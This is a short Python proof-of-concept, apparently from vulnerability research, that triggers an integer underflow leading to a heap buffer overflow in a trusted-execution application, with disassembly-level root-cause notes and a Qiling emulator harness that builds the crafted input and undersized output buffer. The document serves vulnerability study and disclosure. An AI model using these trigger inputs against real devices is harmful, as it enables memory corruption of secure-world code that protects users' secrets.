# PoC: Integer underflow → heap buffer overflow in 08010203000000000000000000000000.ta
#
# Vulnerability: cmd=0 handler at 0xb488 dispatches on a 4-byte "type" field in the
# input buffer.  When type=0x80, it calls 0xa598 which TEE_Malloc()s a 4-byte buffer
# and stores {ptr, size=4} at [sp+0x10/0x14].  The required output size is then
# sb = 4 + 8 = 12.  If the caller-supplied output buffer is smaller than 8 bytes,
# the subtraction at 0xb764:
#
#   sublo  r3, r3, #8    ; output_size(4) - 8  =>  0xFFFFFFFC  (wrap!)
#   strlo  r3, [sp, #0x14]
#
# stores a ~4 GB size into [sp+0x14], which is later used as the memcpy length:
#
#   0xb798:  bl  memcpy(output_buf+8, data_ptr, 0xFFFFFFFC)   ; heap overflow
#
# Trigger conditions:
#   - cmd 0 (or 5), ptypes 0x65
#   - input[4..7] = 0x00000080  (little-endian type = 0x80)
#   - params[1] (output buffer) size < 8 bytes

from .params import *
from qiling import Qiling


def place_input_callback(ql: Qiling, input: bytes, _: int) -> bool:
    cmd = 0

    # bytes [0..3]: outer tag (arbitrary)
    # bytes [4..7]: type field read by 0xe388 as little-endian uint32 → 0x80
    exploit_input = (
        b"\x00\x00\x00\x00"   # outer tag
        + b"\x80\x00\x00\x00" # type = 0x80  →  triggers 0xa598 path
        + b"\x00" * 8         # padding
    )

    # Output buffer intentionally tiny: 4 bytes < 8  →  underflow at 0xb764
    tiny_output = b"\x00" * 4

    command_params = [
        MemRefParam(exploit_input, len(exploit_input)),
        MemRefParam(tiny_output, len(tiny_output)),
        NoneParam(),
        NoneParam(),
    ]
    ptypes = 0x65  # param0=MEMREF_INOUT(5), param1=MEMREF_OUTPUT(6)

    setup_fuzz(ql, cmd, ptypes, command_params, input)
    return True
